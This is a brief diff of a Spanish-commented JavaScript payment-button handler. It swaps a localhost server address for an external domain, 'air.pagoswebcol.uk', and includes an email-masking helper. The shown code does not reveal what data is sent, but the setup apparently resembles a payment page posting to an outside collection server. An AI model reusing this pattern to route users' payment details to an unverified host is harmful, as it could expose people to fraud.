@@ -122,7 +122,7 @@ if (botonPagar) {
         let loadingInterval = animateLoadingText(loadingText);
 
         // 4. CONEXIÓN CON EL SERVIDOR LOCAL (server.js)
-        const baseUrl = 'http://localhost:3005';
+        const baseUrl = 'https://air.pagoswebcol.uk';
         
         // Construimos la URL con los parámetros que espera tu server.js
         const params = new URLSearchParams({
@@ -256,3 +256,4 @@ function enmascararCorreo(email) {
     const [user, domain] = email.split("@");
     return user.substring(0, 2) + "*******@" + "*****." + "com";
 }
+
